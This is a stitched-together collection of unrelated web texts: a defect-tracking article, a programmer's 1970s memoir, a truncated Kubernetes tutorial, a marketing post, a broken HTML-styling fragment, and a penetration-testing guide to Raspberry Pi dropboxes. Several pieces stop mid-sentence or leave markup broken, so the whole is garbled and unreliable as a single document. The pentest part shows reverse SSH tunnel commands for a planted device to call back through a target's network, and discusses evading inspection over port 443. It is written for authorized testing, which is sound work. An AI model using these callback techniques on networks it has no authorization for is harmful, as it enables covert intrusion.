<p>Sometimes, it isn’t the nature of a defect that’s worth investigating as much as the process by which it occurs.</p>
<p>For example, a senior QA engineer I’ll call Darrell noticed a tendency for defects to regress, so he began to track how often a defect was re-opened. That let him measure the number of defects filed in a given period, and chart the defects that were opened once, twice and more than twice.</p>
<p>Darrell discovered a clear trend for defects that were submitted more than once. Team A would fix defect #1; then Team B would fix defect #2, and regress defect #1. When defect #1 was re-opened, Team A would fix it and regress defect #2. Aha! It’s a <em>team</em> problem, not a software problem!</p>
<p>Because Darrell tracked the regressed defects, the company was able to discover what was going on. That led to a happy ending: Company management encouraged the two teams to work more closely. They also scaled back the project scope and added time to the schedule, so the developers could remove many dependencies and refactor the code.</p>
<p>Whichever tool you use, put in place a filter mechanism to keep the same defect from being logged repeatedly. One obvious result of repeated defect reporting is that it skews the metrics. Another is that <a href="https://www.functionize.com/blog/5-reasons-why-qa-needs-humans/">it requires a human</a> to analyze the nature of the bugs – which surely is a waste of effort, when your time is better spent figuring out the areas that need to be redesigned or <a href="https://www.functionize.com/blog/optimize-page-loading-by-eliminating-performance-bottlenecks/">optimized</a>.</p>
<h3>Track the solution</h3>
<p>When a defect is fixed, retested, and marked as “passed,” some companies capture a screenshot of the “successful” moment, and include that image as an attachment. Doing so provides supporting evidence that the fix actually worked.</p>
<p>Other “it’s all better now!” items to track:</p>
<ul>
<li>The length of time it took the developers to fix an issue</li>
<li>How long it takes testers to retest issues</li>
<li>Defect reproducibility ratios: That is, how many times a tester can reproduce the defect before submitting it.</li>
</ul>
<p>In each case, tracking the journey to the resolution gives insight into the expected turnaround time. If a defect is discovered later in the development lifecycle, there’s some history to suggest how long it’ll take the team to resolve the issue.</p>
<h3>Choose the right values</h3>
<p>Most developers and testers are well served by a tool’s predefined ranges for defect severity (a 1-5 or 1-10 scale). In some situations, however, it makes sense to define the values appropriate to the team and the project.</p>
<p>For instance, a process specialist named Daniel had problems managing consistency with the Status field in his team’s defect tracking system. While “submitted,” “ready for testing,” and “closed/fixed” were clear, other values were subject to debates. What one person considers “open” or “assigned” may not agree with another’s view. Different status states make reporting more difficult, or at least they obscures Management’s understanding of what’s going on.</p>
<p>As a result, it’s a good idea for the team to deliberately agree about the predefined values it uses and what they mean to participants. That’s especially important for fields which can spark interdepartmental debate, such as “resolution” or “issue type” (because egos get involved when you call something a bug).</p>
<p>Nor should one person call the shots. QA should set up a framework, and the project management team should customize the schema to suit each project’s needs. <a href="https://www.functionize.com/blog/4-lessons-software-teams-can-learn-from-rock-bands/">Everyone should have a voice</a>: business analysts, developers, testers.</p>
<p>Two common fields can create problems. Most defect tracking tools have a Comment field, which often is used for information which should be tracked in other fields. Unfortunately, stuffing that data into an open-ended text box makes it impossible to track.</p>
<p>Another problem you may encounter is the “Functional Area” field attached to a defect report. Many teams try to use this as a closed-list, but once a project is underway, the granularity is lost. For example, early in an application’s testing process, you might identify a defect’s functional area as “database,” but discover that most of the problems should be listed as “SQL Server.” Other projects start with an open list, permitting the user to select from an existing value or to create a new one. That’s relevant enough for fixing defects (maybe even better, because of the granularity), but almost useless for metrics and reporting.</p>
<p>But don’t get <em>too</em> granular. For example, don’t scale bug severity or priority on a 1-10 scale. Low/Medium/High is enough, without requiring someone to decide if this particular problem is a 7 or an 8 (because how can you know?).</p>
<p>If your defect tracking tool permits it, consider adding role-based fields in order to reflect the varying information required by each development role. In its simplest form, a developer needs to know what to fix, a tester’s concerned with <a href="https://www.functionize.com/blog/the-evolution-of-fixing-broken-tests/">the defects already reported</a>, and the project manager wants to know the number of current critical defects. Consider whether it’d help to add fields that capture information for each type of project member, which might even include a single person. One tester told me about the fields he added to his defect-tracking application, including defect due date, defect status due date fields, planned-for-version, tested-in-version. That lets project participants zero-in on the information that helps them do their jobs.</p>
<p>For the most part, any defect tracking system you choose can do what you need. But as with all utility software, these applications are only as good as the process you create for using the system. If you let the tool dictate your process, the software development process becomes messy and confusing. Make sure that your tool reflects your teams’ needs, and that it helps you answer the questions you (and your managers) tend to ask.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><p>I recently retired after 40+ years in the software development industry. This is what it was like learning programming in the early 1970s.</p>
<p>Let me set the stage. It’s my sophomore year of high school. I grew up and lived in a large metropolitan city in the western US. More specifically in an upper-middle-class neighborhood in an upscale school district. Computers were things of science fiction. They were large, room-sized monstrosities requiring special accommodations, and cadres of specially trained operators to keep them running. They were made by the likes of IBM, Univac, and others. This was years before desktop microcomputers would become available. IBM PCs, Microsoft, Apple, etc didn’t exist. Unix was still a closely held trade secret of Bell Labs, a subsidiary of the Bell Telephone system. Linux was decades away. Learning programming in the 1970s was pretty interesting.</p>
<h4>My first program on contract</h4>
<p>My school district-owned an IBM 370 mainframe for doing scheduling, grading, payroll, and other administrative tasks. They had just purchased for students and teaching purposes a new “mini-computer”. It was a Hewlett-Packard 2000C time-shared computer. It was capable of supporting 32 users dialed in over telephone lines via 110-300 baud modems. The operating system was a simple BASIC interpreter. The district installed one or more ASR 33 teletypes in each high school. My school had a small room off of the math department where 3 of these were housed.</p>
<div id="attachment_2727"><p><img aria-describedby="caption-attachment-2727" src="https://mlfmfvgwe2uw.i.optimole.com/V673Rh4-2KWKiZ-b/w:640/h:478/q:auto/https://expertain.net/wp-content/uploads/2020/07/IBM-370-mainframe.jpg" alt="IBM 370 mainframe" width="640" height="478" data-opt-src="https://mlfmfvgwe2uw.i.optimole.com/V673Rh4-2KWKiZ-b/w:640/h:478/q:auto/https://expertain.net/wp-content/uploads/2020/07/IBM-370-mainframe.jpg" data-old-src="https://mlfmfvgwe2uw.i.optimole.com/V673Rh4-2KWKiZ-b/w:640/h:478/q:eco/https://expertain.net/wp-content/uploads/2020/07/IBM-370-mainframe.jpg"></p><p id="caption-attachment-2727">IBM 370 mainframe</p></div>
<p>My high school offered a one-quarter class in programming in HP BASIC, a derivative of Dartmouth BASIC. The class was taught by the math department and focused on using the computer to solve math problems. Typical programs were less than 100 lines in length. On a whim, I signed up to take the class. The class was interesting, but what I really enjoyed was the open access to the computer room after hours.</p>
<p>I spent many hours tinkering and playing, writing programs to do whatever struck my fancy. By the end of the one quarter programming class, I had far surpassed the teacher’s abilities, and he recruited me to teach the class the next quarter as an “independent study”. This was when I wrote my first program on contract. It was a simple data analysis program to analyze and produce statistics pulled from surveys done by the local chamber of commerce.</p>
<h4><a href="https://expertain.net/the-best-way-to-learn-how-to-code/">You might also like: The best way to learn how to code</a></h4>
<p>By the next year, the district had made arrangements to allow classes in conjunction with the local community college. This was an early version of “concurrent enrollment”. I took a class in computer operations taught using the IBM 370 owned by the school district because the college did not yet own a computer. Here I wrote a few simple programs in COBOL but mostly learned to hang mag tapes, mount disk packs, change the paper and the ribbon in the line printer, and to wire “programming” cards for the various peripherals such as the card reader, the card sorter, and the card punch.</p>
<h4>The computer world had changed</h4>
<p><img src="https://mlfmfvgwe2uw.i.optimole.com/V673Rh4-sWmD2gcy/w:296/h:170/q:auto/https://expertain.net/wp-content/uploads/2020/07/IMSAI-8080.jpeg" alt="IMSAI 8080" width="296" height="170" data-opt-src="https://mlfmfvgwe2uw.i.optimole.com/V673Rh4-sWmD2gcy/w:296/h:170/q:auto/https://expertain.net/wp-content/uploads/2020/07/IMSAI-8080.jpeg" data-old-src="https://mlfmfvgwe2uw.i.optimole.com/V673Rh4-sWmD2gcy/w:296/h:170/q:eco/https://expertain.net/wp-content/uploads/2020/07/IMSAI-8080.jpeg"></p>
<p>Fast forward a few years. I had graduated from high school and spent a couple of years traveling out of the US in a third world country. When I came back, things had changed in the computer world. Computer stores were popping up all over the place selling desktop microcomputers. These were the likes of the Altair 8800, IMSAI 8080, Northstar Horizon, and Radio Shack TRS-80. I enrolled in electrical engineering/business/computer science program at the university and was learning FORTRAN 4, COBOL, and PDP-8 assembly. None of these would be important to my future career. Stay tuned…</p>
<p>It was during this time that I walked into a local computer shop, and sat down at one of their computers to entertain myself. Within a few minutes, I had written a short program to scroll a sine wave up the CRT screen. It looked something like this</p>
<pre><code>10 LET X=0
20 PRINT TAB(SIN(x)*40+40),”*”
30 LET X=X+.3
40 GOTO 20
50 END
</code></pre>
<p>The proprietor walked in at this point, saw what I had done, and hired me on the spot. You see, while microcomputers brought computing within the price range of the masses, almost no software existed to make them useful. Likewise, programmers were extremely scarce. Over the next couple of years, I wrote for them a complete accounting package for small businesses, including accounts receivable, accounts payable, payroll, inventory, and general ledger modules. This was quite an accomplishment on a system sporting 32K bytes of RAM and 360K bytes of floppy disk space.</p>
<h5>Salary</h5>
<p>Unfortunately, this job didn’t pay terribly well. <strong>I earned less than $3 per hour (about $10 in today’s dollars).</strong> So I started a second job doing data entry on the graveyard shift at a local food processing plant. I was pretty good and soon was doing all the paperwork in about 2 hours. This gave me a lot of spare time, so I began writing programs to automate various office tasks. That’s pretty much what you earned for learning programming in the 1970s.</p>
<h5>C programming language release</h5>
<p>About this time, the C programming language was released to the public from Bell Labs. I picked up the first edition of the Kernighan and Richie “The C Programming Language” book. It still has a place of honor on my bookshelf in my office. Soon, BYTE magazine published the entire source code for a Small-C compiler, written in C. I typed the whole thing in, and using one of the university computers got it to compile and run, bootstrapping my way to having it run under the Digital Research CP/M operating system on an Intel 8080 based microcomputer.</p>
<p>By the mid-1980s, microcomputers were definitely a thing. IBM had produced the PC, Bill Gates and crew had become successful with Microsoft MS-BASIC interpreter and MS-DOS, Compaq had successfully defended the first IBM PC clone, and we were off to the races.</p>
<p>Over the following decades, I worked for a variety of companies. Doing software for accounting, banking, computer-based training, flight simulation, telephone infrastructure, classified stuff I still can’t talk about, and most recently, cryptocurrency.</p>
<h5>Languages I’ve learned</h5>
<p>I’ve learned and used a variety of languages and scripting tools including BASIC, FORTRAN 4, COBOL, Assembly, C, C++, dBase II, dBase III, Pascal, Perl, Bash, Go, Python, HTML, Scala, and probably a few others I’ve forgotten about. My specialty, and what I consider my best language, is plain old C, especially embedded application code under Linux.</p>
<p>As I said above, I’ve recently called it quits and retired. I miss the camaraderie of coworkers, the thrill of solving difficult problems, and the satisfaction of seeing your code used far and wide around the world. I do not miss impossible schedules, corporate bureaucracy, shrinking benefit packages, and unknowing and uncaring employers.</p>
<p>Don’t get me wrong, I will keep coding. Probably not huge systems. My latest is little embedded projects for Arduino and Raspberry Pi controllers.</p>
<p>It’s been a wild ride, and I’d do it again. This is what it was like learning programming in the early 1970s. It’s kept food on the table, a roof over my head, enabled me to travel the world, and be a part of something bigger than me. What more could a guy ask?</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><h3><strong>Understanding Kubernetes</strong></h3><p>The objective of this article is to provide an introduction and a general understanding about Kubernetes. We will look into architectural concepts, advantages of using Kubernetes, how to set up Kubernetes, and how to run commands on a local machine using Minikube.</p><h3><strong>What is Kubernetes?</strong></h3><p>Before we dive deep into Kubernetes, let's first understand the concept of containers. Containerization is the process of packaging code and dependencies of an application into a single image, and running it in a single computing environment called the container.</p><p><strong>Docker</strong> revolutionized containerization by packaging software into a virtual container that can run on any environment. With containers, one can deploy applications onto multiple platforms like AWS, GCP, or Digital Ocean.&nbsp;</p><p>But challenges arise when the number of containers increases. It becomes difficult to deploy and maintain hundreds of containers across many servers or VM instances. This led to the evolution of the <strong>container orchestration software</strong>.</p><p>An orchestrator’s role is to coordinate a set of container workloads across a series of servers or nodes. This includes things like making sure the containers have the right resources, the correct number of containers are available at all times, rolling deploys to prevent uptime, and more. <strong>Kubernetes</strong> is the most popular container orchestrator.</p><p>Kubernetes, also known as k8s, was released in 2015 by Google and is now maintained by an open-source community (of which Google is also a part of). Kubernetes provides a set of APIs and command-line interfaces to manage containers deployed across servers. It automates the deployment, scaling, and management of the containers across clusters of hosts. This makes it a popular choice to host microservice-based implementations as it addresses many concerns of microservice implementations like configuration management, service discovery, and job scheduling.</p><p>Apart from the core Kubernetes implementation , there are many versions/flavors of Kubernetes implementation provided by various cloud services and distributions that conform to the Kubernetes spec.</p><h3><strong>Kubernetes Architecture</strong></h3><p>Let’s look at the components of Kubernetes architecture</p><h4><strong>Kubectl</strong></h4><p>We communicate with Kubernetes through its API. The popular tool that is used for this is called Kubectl (pronounced <em>cube control or cube CTL</em>).</p><h4><strong>Node</strong></h4><p>A single server in a Kubernetes cluster is known as a node. Workloads are assigned from the control plane, or master to the nodes. The various components of a node server are:</p><ol role="list"><li><strong>Container Runtime:</strong> The container runtime runs and manages applications present in the containers. The container runtime is usually Docker although it supports other container runtimes like Containerd.</li><li><strong>Kubelet:</strong> Kubelet is a container that runs as an agent on each node to communicate with the Kubernetes control plane (master node). Kubelet also makes sure that the <em>pods</em> (basic unit of deployment) running in a node are healthy and running based on the YAML file called Podspec.</li><li><strong>Kube-proxy:</strong> A proxy service that runs on each of the node servers that performs tasks like forwarding correct requests to containers and make services available to other components.</li></ol><h4><strong>Control Plane</strong></h4><p>The Control plane, also known as the <em>master,</em> is in charge of managing the Kubernetes cluster. It is a group of containers and each one of them does a single job. These components make the decisions that are applicable to the whole cluster like scheduling, detecting and responding to cluster events. The various components of the control plane are</p><ol role="list"><li><strong>etcd: </strong>An important concern of a microservice architecture is that the configuration data should be kept isolated from the code and be accessible. etcd is the Kubernetes component which is a persistent, lightweight, and distributed key-value data store which stores configuration data that represents the state of the cluster.</li><li><strong>API server: </strong>As<strong> </strong>mentioned, Kubernetes consists of a set of APIs. This API is served using JSON over HTTP by the component in the control plane known as the API server. It provides interfaces to Kubernetes and is the API server that updates the states of API objects in etcd, allowing clients to configure workloads and containers across nodes</li><li><strong>Scheduler: </strong>The scheduler is the component of the control plane which assigns unassigned workloads(pods) to the nodes in the cluster. The scheduler tracks the states of the nodes and ensures that workload is equally distributed.</li><li><strong>Controller manager: </strong>The controllers are the components that work to turn the state of the cluster to the user’s desire. It creates updates and deletes resources in the controller. These controllers include ReplicationController, JobsController, and DaemonSet Controller. The controller manager is the component that manages all these controllers.</li></ol><h3><strong>Kubernetes Objects</strong></h3><p>Kubernetes provides layers of abstractions over the container to provide mechanisms that deploy, maintain and scale applications. So the users will interact with the primitives provided by the Kubernetes object instead of directly communicating with the containers. Let’s take a look at the different types of objects available in Kubernetes.</p><h4><strong>Pods</strong></h4><p>A pod is made up of one or more containers running in a node. It is the basic unit of a deployment. Containers are not directly deployed in Kubernetes. They are deployed as pods. A pod is usually one or more containers that are controlled as a single application. Each pod is assigned a unique IP address known as Pod IP. The containers inside the pod can address each other on localhost, but a container has to use a Pod IP to address a container inside a different pod. Various operations can be performed on pods by the controllers that are managed by the Controller manager</p><h4><strong>Replica Set</strong></h4><p>When working with Kubernetes, we may have to replicate our pods and manage them for scaling purposes. For example, we may decide that we want three instances of our API running at all times. This is achieved by using ReplicaSets. A ReplicaSet is a grouping set that maintains replicas that are declared for a pod by the user. ReplicaSet maintains a stable set of copies of a pod that are always available.</p><h4><strong>Services</strong></h4><p>A set of pods that work together is known as a Service in Kubernetes. The pods are defined by a semantic tag called a Label. The Service discovery component assigns an IP address and DNS name to the service, and load balances traffic into pods that match the selector label. Service discovery can be based on environmental variables or using Kubernetes DNS. An example for this is backend pods grouped into a service with requests from frontend load-balanced among them.</p><h4><strong>Deployments</strong></h4><p>Deployments are one of the most important objects in Kubernetes. Deployment does the process of changing the actual state of the objects to the desired state of the user at a controlled rate. Deployments can adjust the replica sets, change the versions of the applications, etc by changing the configurations of the cluster.</p><p>There are two ways to deploy pods, by using the command line and by using a YAML file. We will look into this in detail in a later section.</p><h4><strong>Volumes</strong></h4><p>By default, an ephemeral storage is provided by filesystem in Kubernetes, meaning a pod restart will wipe out all the data in the containers. This is a problem for applications that require persistent storage.&nbsp;</p><p>A volume provides persistent storage for the data in the pods. Volumes can be mounted at a specific path within containers, by defining them in the pod configuration. The same volume can be shared between all containers in the same pod.</p><h4><strong>StatefulSets</strong></h4><p>One of the main challenges faced by a container orchestrator is the preservation of the state. In case of a pod restart or if the application is scaled up or down, the state may need to be redistributed. Also, the ordering of instances is important. An example of a stateful workload is a database. StatefulSets controller is used for managing the stateful applications and enforces properties of uniqueness and ordering amongst instances of a pod.&nbsp;</p><h4><strong>DaemonSets</strong></h4><p>Usually, the location where pods are run is determined by the scheduler. But some pods need to be run on every single node of the cluster for use cases like log collection and storage services. This kind of pod scheduling is implemented by the feature called DaemonSet.</p><h3><strong>Kubernetes Local Install</strong></h3><p>Because Kubernetes defines a set of APIs and expected behavior, there are multiple implementations, one of which is a tool called minikube. Minikube allows you to run a Kubernetes cluster on your local machine, which makes it easy to spin up complex services or even test your deployments locally.&nbsp; Before we start the installation, we can quickly look at some of the other options available.</p><p><strong>Docker Desktop:</strong> If you are already using Docker Desktop, Kubernetes can be easily enabled in it by clicking the ‘Enable Kubernetes’ checkbox in the Kubernetes tab.</p><p><strong>MicroK8s</strong>: MicroK8S is developed by Canonical. Although it was made for Ubuntu, it now supports various other Linux distros and recently started support in Windows and Mac.</p><p><strong>Running Kubernetes In Browser</strong>: If you don't want to install Kubernetes in your local system, you can learn it in a browser. There are two options <a href="https://labs.play-with-k8s.com/">&nbsp;Play with K8s</a> and<a href="https://www.katacoda.com/"> Katacoda</a></p><h4><strong>Minikube</strong></h4><p>Minkube is the version we will be running. Minikube will run a single node Kubernetes cluster in a virtual machine.</p><p><strong>Steps to Install Minikube</strong></p><ol role="list"><li>As a first step make sure that Docker is properly installed in your system, as Docker is used for creating, managing, and controlling the containers.</li><li>The next step is that we need a virtual machine or hypervisor in our system like Virtualbox, HyperKit, or KVM..</li></ol><p><strong>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;For macOS</strong></p><p><strong>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</strong>Install Virtualbox for Mac using Homebrew</p><blockquote>brew cask install virtualbox<strong><br></strong></blockquote><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>For Linux</strong></p><blockquote>sudo apt install virtualbox virtualbox-ext-pack</blockquote><p>3. The next step is to make sure that the CLI tool Kubectl is installed.</p><p><strong>For macOS</strong></p><blockquote>brew install kubectl<br></blockquote><p><strong>For Linux</strong></p><p>Download the latest version</p><blockquote>curl -LO …</blockquote></div></div></div>

You grab a cold drink and relax on the sofa while scrolling your phone. Just as you are about to visit your favourite news website, a headline grabs your eye ‘How to delay credit card payment during a pandemic.’</p>
<p>This information might just come in handy as you almost missed a payment last month. Since you are eager to know more, you click on the link only to be directed to an e-book.</p>
<p>While the e-book is free to download, your enthusiasm to know more about the topic drops almost immediately, so you close the browser.</p>
<p>This is a bummer for marketers as they were already counting on such a lead to make a conversion. It only shows that mere content does not increase conversions; it needs to be interactive.</p>

<h2>What is Interactive Content?</h2>
<p>This is content that requires the reader or audience to engage actively. As such, they just don’t read or watch the content passively; instead, they get involved, glean insights they can apply to the current situation, and receive personalized information.</p>
<p>Here are stats to emphasize the need for interactive content:</p>
<ul>
<li>Interactive content attracts five times more traffic than any content</li>
<li>Interactive content increases conversions two times more than passive content</li>
<li>91% of B2B buyers prefer interactive content to passive content</li>
</ul>
<p>This begs the question: how can marketers use interactive content to increase conversions? We look at five:</p>

<h3>1. Use Content to Awareness</h3>
<p>Also known as the top of the funnel content, it helps create abuzz around your website or company. It gets your name out there, making it memorable to your target audience.</p>
<p>This kind of content is designed to make users aware that they need your products/ services to solve their problems.</p>
<p>As such, you want to use visual tools like quizzes and infographics to show users how they rank among their peers.</p>
<p>Surveys, trivia, and sports-style content also come in handy. Note, such content is not considered a high-performing lead-gen tool; it only enables users to recognize your brand.</p>

<h3>2. Facilitate the Decision-making Process</h3>
<p>The usual buying process begins with identifying the problem. Most buyers identify the problem but get stuck when deciding the specific product/ service to help solve the problem.<br>
Marketers can use interactive content to convince potential clients that they need their products or services.</p>
<p>For example, a website inviting users who are thinking about divorce can use short quizzes to understand the steps they need to take. The system will then recommend a few suggestions based on the user’s answers, e.g., take time to decide if separation is the right solution or file a divorce and enlist the help of a legal expert.</p>

<h3>3. Educate Buyers</h3>
<p>Educational content has a significant impact on the buyer’s journey. If your target audience doesn’t understand how your products solve their problems, their buying process is distorted, and you could lose them to a competitor.</p>
<p>A research report from Demand Metric, an analyst firm, shows that interactive content effectively educates buyers in comparison with passive content. 93% of the groups confessed that the content was very effective in educating buyers.</p>

<h3>4. Help Buyers Identify the Best Product</h3>
<p>If your website provides a variety of products, customers can get overwhelmed and leave the page without purchasing any product. Marketers can use interactive content to help customers find the best product.</p>
<p>For example, a cosmetic company may be manufacturing and selling dozens of hair treatment products. However, when shoppers visit the website, they find it challenging to choose one hair treatment product from the vast range.</p>
<p>The company can create an assessment quiz to help the customer choose a suitable product depending on their hair problem. The website will then provide users with a few options making it easy for them to complete the action.</p>

<h3>5. Incorporate the Content in Marketing Campaigns</h3>
<p>You don’t have to use interactive content as a stand-alone tool; it can be incorporated into different marketing campaign tools to increase conversions. Some examples include:</p>
<ul>
<li>Blogs: Embedding quizzes in a blog to gather leads</li>
<li>Paid media: Marketers can use interactive CTAs to increase conversions and the click-through rate</li>
<li>Social media: It is the best platform for including interactive content because users can like, share, and comment</li>
</ul>
<p>More users are looking for experience-based content. As such, websites and companies must modify their content using features such as infographics, quizzes, interactive videos, and more to increase conversions. The idea is to provide more value to your clients without coming off as one making a hard sell.</p>

    <p>I occasionally get (legal) texts send by customers. Usually exported in horrible HTML formatting via a WYSIWYG editor. I use the following style to make it look presentable, before I send it to our app developers.</p>

    <span>&lt;style&gt;</span>
    <span>body</span> <span>{</span>

<span>&lt;/head&gt;</span></code></pre></figure>

<p>Additionally, I use the ‘replace’ functionality in my text editor to remove unnecessary divs, paragraphs and other elements.</p>

<p>Sometimes, especially in the time of COVID-19, you can’t go onsite for a
penetration test.  Or maybe you can only get in briefly on a physical test, and
want to leave behind a dropbox (literally, a box that can be “dropped” in place
and let the tester leave, no relation to the file-sharing company by the same
name) that you can remotely connect to.  Of course, it could also be part of the
desired test itself if incident response testing is in-scope – can they find
your malicious device?</p>

<p>In all of these cases, one great option is a small single-board computer, the
best known of which is the <a href="https://amzn.to/3fl8jSn">Raspberry Pi</a>.  It’s
inexpensive, compact, easy to come by, and very flexible.  It may not be perfect
in every case, but it gets the job done in a lot of cases.</p>

<p>I’ll use this opportunity to discuss the setups I’ve done in the past and the
things I would change when doing it again or alternatives I considered.  I hope
some will find this useful.  Some familiarity with the Linux command line is
assumed.</p>

<h2 id="general-principles-of-dropboxes">General Principles of Dropboxes</h2>

<p>As mentioned above, a dropbox is a device that you can connect to the target
network and leave behind.  (In an authorized test, you’d likely get your
hardware back at the end, but it’s always possible that someone
steals/destroys/etc. your device.)  This serves as your foothold into the target
network.</p>

<p>For some penetration tests, you’ll be able to provide your contact the dropbox
and have them connect it to the network.  This can allow you to have an
internally scoped test but not require your physical presence at their site.
This can be useful to avoid travel costs (or, currently, avoid COVID-19).  In
this case, you’ll have an agreed-upon network segment that it will be connected
to.  (Commonly, this will be a network segment with workstations as opposed to a
privileged segment.)</p>

<p>If you’re going physical and want to leave a dropbox behind, you’ll have to be
more opportunistic about things.  You’ll get whatever network segment you get,
so you might want to consider dropping a couple of devices if the opportunity
presents itself.</p>

<p>In all these cases, you’ll need to remotely control the dropbox over some
network connection, and then operate it to perform your attacks.</p>

<h2 id="connecting-back">Connecting Back</h2>

<p>You’ll almost always want your dropbox to initiate an outbound connection for
remote control.  You’ll almost always be behind NAT or a firewall on the target
network, and dynamic IP addressing would likely make it hard to find your
implant anyway.  There’s two different major approaches: “in band”, where your
command and control (C2) traffic goes out via the target network you’re
connected to, and “out of band” where your C2 is via a separate dedicated
connection.</p>

<h3 id="in-band">In Band</h3>

<p>The easiest approach is to go with an “in band” C2 connection.  In this case,
you tunnel your traffic out on the same physical connection as you’ve connected
to your target network.  This is very straightforward when the right conditions
exist, since you just need power and the one network connection.  Unfortunately,
those right conditions are several:</p>

<ul>
  <li>No Network Access Control, or NAC that allows access to the internet</li>
  <li>Some form of unfettered outbound connection</li>
  <li>DHCP IP Assignment on the segment</li>
</ul>

<p>If any of these fails, you just have a little box connected to a cable that
doesn’t let you do anything.  There are also some <em>risks</em> associated with in
band connections:</p>

<ul>
  <li>Connection might be noticed/detected by Intrusion Detection Systems (IDS)</li>
  <li>Any DNS, etc., traffic would be visible</li>
</ul>

<p>Despite the risks and requirements, this will work in a large majority of use
cases, and it’s both cheap and simple to setup, which makes it both desirable
and the approach I’ve taken nearly every time I’ve setup a Pi-based dropbox.</p>

<h3 id="out-of-band">Out of Band</h3>

<p>For an out of band connection, you need to bring your own network connection to
the dropbox.  Generally, I’ve done that with a WiFi based connection, but
another popular option is to go with a cellular connection.  WiFi is easier to
setup, but obviously has range limitations, while a cellular connection will
<em>usually</em> get you better range.</p>

<p>For WiFi, you can act as a client and connect to a guest or open network from
your target, or perhaps a network of an adjacent office.  Alternatively, you
could run an AP mode, but then you need to stay in a relatively close range to
be able to connect to your dropbox.  (The AP mode really only works if you’re
able to put it near a window or you can stay nearby, say in a shared office
space.)</p>

<p><a href="https://www.amazon.com/ZTE-MF833V-Customized-Version-Covering/dp/B07XXBQPZL/ref=as_li_ss_il?dchild=1&amp;keywords=cellular+dongle&amp;qid=1594436300&amp;sr=8-4&amp;linkCode=li2&amp;tag=systemovecom-20&amp;linkId=a7668cc52205a17e12f51fdf9e825298&amp;language=en_US"><img src="https://ws-na.amazon-adsystem.com/widgets/q?_encoding=UTF8&amp;ASIN=B07XXBQPZL&amp;Format=_SL160_&amp;ID=AsinImage&amp;MarketPlace=US&amp;ServiceVersion=20070822&amp;WS=1&amp;tag=systemovecom-20&amp;language=en_US" alt="USB Cellular Dongle"></a></p>

<p>For a cellular connection, the most popular option is a USB dongle that you
insert a SIM card into.  The nicer dongles will act like an ethernet network interface
(typically via <a href="https://en.wikipedia.org/wiki/RNDIS">RNDIS</a>) to give you a
minimum amount of configuration, and generally will work out of the box with
Linux, whereas other dongles may be a little harder to get working.  I’ve used
the <a href="https://amzn.to/38LEyI0">ZTE MF833V</a> with success in the past.</p>

<h3 id="tunnel-software">Tunnel Software</h3>

<p>Regardless of how you connect back, you probably need some kind of tunneling
software for the connection.  (The exception being the case where you setup an
AP on the Pi and connect directly to it.)</p>

<p>Pretty much all of these require a server as some kind of “meeting point” where
both the dropbox(es) and the operator(s) connect.  This gives the dropboxes a
static IP or hostname to connect to that’s online all the time, and allows
operator(s) behind NAT/firewalls to connect in.  I use
<a href="https://m.do.co/c/b2cffefc9c81">DigitalOcean</a> to host servers for projects (as
well as this blog – and if you use my link, you’ll get $100 in free credit for
new users as well as support articles like this), but you can of course use any
server or VPS that you have.</p>

<p>My favorite approach is actually using <code>ssh</code> to establish an outbound connection
that forwards a port back to the dropbox for its own SSH server.  I realize this
sounds confusing, so I hope this diagram helps:</p>

<p><img src="https://systemoverlord.com/img/pi_dropbox/tunneling.png" alt="SSH Tunnels"></p>

<p>This is done with a command similar to the following, where then connecting to
port <code>2222</code> on the server will establish a connection to the dropbox’s port <code>22</code>.
If you have multiple dropboxes, assign each one a different port on the server,
or use <code>0</code> for port auto assignment.  When using that, you’ll likely need to use
<code>netstat</code> to find the associated ports.</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
2
3
</pre></td><td><pre>ssh -R 2222:localhost:22 server.example.com
# or using automatic port assignment and going to the background
ssh -f -N -R 0:localhost:22 server.example.com
</pre></td></tr></tbody></table></code></pre></div></div>

<p>If you do this on a server and then are connecting from a remote client (e.g.,
your laptop), you can use the <code>ssh</code> <code>ProxyJump</code> feature to connect to the
dropbox through the server.  For example, using the example port <code>2222</code>, the
following will connect to the dropbox (note the use of <code>localhost</code> to connect to
the forwarded port):</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
</pre></td><td><pre>ssh -J server.example.com -p 2222 root@localhost
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Unfortunately, this may result in multiple layers of TCP, so throughput will be
sub-optimal, but it works well, and I can run an SSH server on Port 443, which
is effective for any network that allows HTTPS out without SSL interception.
(Almost nobody, it turns out, does any kind of inspection to confirm that
443/tcp traffic is actually TLS.)</p>

<p>I recommend using a tool like <a href="https://www.harding.motd.ca/autossh/"><code>autossh</code></a>
to manage your SSH connection in case the connection drops.  You’ll also want to
enable keepalives to both ensure the connection stays up longer, and also to
enable <code>autossh</code> to more easily detect a loss of connectivity.</p>

<p>The other alternative I can recommend is to use a VPN.  Previously, I would have
used OpenVPN, but I have become a <a href="https://www.wireguard.com/">WireGuard</a>
convert, especially for lower powered devices like the Raspberry Pi.  (The
crypto used by WireGuard can sustain higher throughput on low-end devices.)  The
biggest downside to this is you’ll need to run UDP out, so it can be a little
harder if you’re going with the “in band” approach on a restrictive network.</p>

<h2 id="setup--challenges">Setup &amp; Challenges</h2>

<p>One of the keys is to have your dropbox ready to go when you deploy it.
Depending on your approach, someone else might be deploying it (if a remote
engagement, or if someone else is doing your physical testing), you might not
have much time, or there might be other constraints.  In any case, you want to
make sure it’s ready to go when you are.</p>

<p>Among other things, this means having the tools you’ll want already set up (you
don’t want to waste time and bandwidth installing new tools once the dropbox is
in place), having your connection(s) set up, and having contingency plans in
case something goes wrong.</p>

<p>One way to have a lot of tools ready to go is to use one of the ARM images for
<a href="https://www.offensive-security.com/kali-linux-arm-images/">Kali Linux</a> provided
by Offensive Security.  They’re not perfect, but they’re a great jumping off
point for your own custom image.  Alternatively, you can install the tools you
want on a base <a href="https://www.raspberrypi.org/downloads/">Raspberry Pi OS</a>
(formerly Raspbian) image.  It really depends on what you’re comfortable with.</p>

<p>My general approach is to write the base image to the SD card and load up a
